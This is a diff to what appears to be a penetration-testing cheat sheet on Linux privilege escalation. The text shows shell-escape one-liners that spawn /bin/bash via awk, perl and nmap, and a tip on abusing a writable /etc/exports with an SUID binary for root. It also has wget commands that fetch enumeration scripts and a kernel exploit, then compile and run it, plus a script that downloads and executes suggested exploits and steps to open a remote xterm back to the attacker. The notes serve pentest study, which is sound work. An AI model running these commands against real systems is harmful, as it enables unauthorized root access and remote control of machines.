@@ -52,7 +52,7 @@ find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 awk 'BEGIN {system("/bin/bash")}'
 --interactive
 echo "os.execute('/bin/sh')"
-sudo nmap --script=exploit.nse	nmap (thanks to comment by anonymous below)
+sudo nmap --script=exploit.nse    nmap (thanks to comment by anonymous below)
 perl -e 'exec "/bin/bash";'*
 
 Services information
@@ -62,8 +62,12 @@ Services information
 Linux elevation of privileges
     First try simple sudo:
     *$ sudo su*
+    What can we run with sudo?
+    *$ sudo -l*
     What services are running as root?:
     *$ ps aux | grep root*
+
+    If /etc/exports if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
 
     Scripts to run
     *wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
@@ -71,6 +75,8 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
 wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
 
+    The following script runs exploit suggester and automatically downloads and executes suggested exploits:
+    *https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py*
 Exploits worth running
     CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
     *https://www.exploit-db.com/exploits/15285/*
@@ -196,3 +202,11 @@ except:
 
     Ring0 kernel exploit for 2.3/2.4
     *wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0*
+
+Open an xterm remotely
+    First, run an xserver in your machine
+    *$ Xnest :1*
+    Then, bind it to xterm, again in your machine:
+    *$ xterm -display 127.0.0.1:1*
+    Finally, run the follwing in the remote machine:
+    *$ /usr/openwin/bin/xterm -display yourip:1
